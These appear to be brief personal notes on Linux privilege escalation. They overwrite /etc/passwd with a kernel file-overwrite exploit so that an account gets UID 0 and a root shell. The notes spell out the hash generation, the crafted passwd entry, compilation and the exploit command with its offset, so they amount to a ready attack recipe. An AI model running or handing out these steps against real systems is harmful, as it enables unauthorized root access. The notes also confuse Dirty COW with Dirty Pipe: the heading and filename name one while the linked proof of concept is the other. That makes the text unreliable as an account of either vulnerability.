# To exploit dirty cow we have a file that we are going to overwrite and insert data into. 
	We cannot create files and need one that we can read but still will priv esc. /etc/passwd is great for this
	
## Utilizing Max Kellerman's POC we will do so - https://dirtypipe.cm4all.com/
	
###  Creating a password
	openssl passwd -6 --salt cyb "P@$$W0RD"
		$6$cyb$jHyQnPQT6bgzTbfyKU1Jyx5Vje5b3rvlwEDfX1O1Y/3E0b5HeKDusP9pEqD5NFNyfLy.isggSn.4FPcBkTYks/

### Crafting the exploit and paramters
	First we have to make it into  /etc/passwd format as such adn overwrite an existing user
	'steveirwincyber:$6$cyb$jHyQnPQT6bgzTbfyKU1Jyx5Vje5b3rvlwEDfX1O1Y/3E0b5HeKDusP9pEqD5NFNyfLy.isggSn.4FPcBkTYks/:0:0::/root:/bin/bash
'
### Compile the exploit
	gcc dirtcow.c -o exploit
	
### Run the exploit on the system
	./exploit /etc/passwd 189 'steveirwincyber:$6$cyb$jHyQnPQT6bgzTbfyKU1Jyx5Vje5b3rvlwEDfX1O1Y/3E0b5HeKDusP9pEqD5NFNyfLy.isggSn.4FPcBkTYks/:0:0::/root:/bin/bash
'

	